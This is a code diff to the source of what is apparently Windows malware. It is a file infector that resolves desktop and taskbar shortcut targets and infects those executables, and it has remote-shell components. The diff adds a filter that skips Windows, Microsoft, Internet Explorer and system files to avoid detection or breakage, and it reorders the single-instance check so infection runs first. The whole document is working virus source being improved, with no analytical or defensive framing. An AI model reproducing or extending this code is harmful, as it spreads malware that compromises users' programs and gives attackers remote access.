@@ -6,6 +6,28 @@
 
 
 HANDLE G_hMutex;
+
+BOOL IsFilter(const char *Path)
+{
+	char Buffer[MAX_PATH];
+	strcpy(Buffer,Path);
+	strupr(Buffer);
+	if (strstr(Buffer,"INDOWS"))
+	{
+		return TRUE;
+	}
+	if (strstr(Buffer,"ICROSOFT"))
+	{
+		return TRUE;
+	}
+
+	if (strstr(Buffer,"NTERNET EXPLORE"))
+	{
+		return TRUE;
+	}
+	return FALSE;
+}
+
 BOOL IsAlreadyRunning()
 {
 	G_hMutex = ::CreateMutex(NULL,TRUE,REMOTESHELL_PROCESS_GUID);
@@ -38,8 +60,15 @@ int InfectDirectory(const char *Dir)
 		LnkFile lnkf;
 		
 		sprintf(FileName,"%s\\%s",Dir,findFileData.cFileName);
-		if(XInfester_InfectFile(lnkf.GetLnkTargetFilePath(FileName)))
-			InfectCount++;
+		const char *infFile=lnkf.GetLnkTargetFilePath(FileName);
+		DWORD fileattr=GetFileAttributesA(infFile);
+
+		if(!(fileattr&FILE_ATTRIBUTE_SYSTEM))
+		{
+				if(!IsFilter(infFile))
+				if(XInfester_InfectFile(infFile))
+				InfectCount++;
+		}
 
 		if (!FindNextFile(hHandle,&findFileData))
 		{
@@ -55,11 +84,6 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 	//X Infester starter
 	XInfester_Run();
 
-	if (IsAlreadyRunning())
-	{
-		exit(0);
-	}
-	
 	//Infect process
 	//Desktop
 	char path[MAX_PATH];
@@ -68,6 +92,12 @@ int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, 
 	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
 	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
 	InfectDirectory(path);
+
+	if (IsAlreadyRunning())
+	{
+		exit(0);
+	}
+	
 
 	if (!G_RemoteFrameWork.Initialize())
 	{
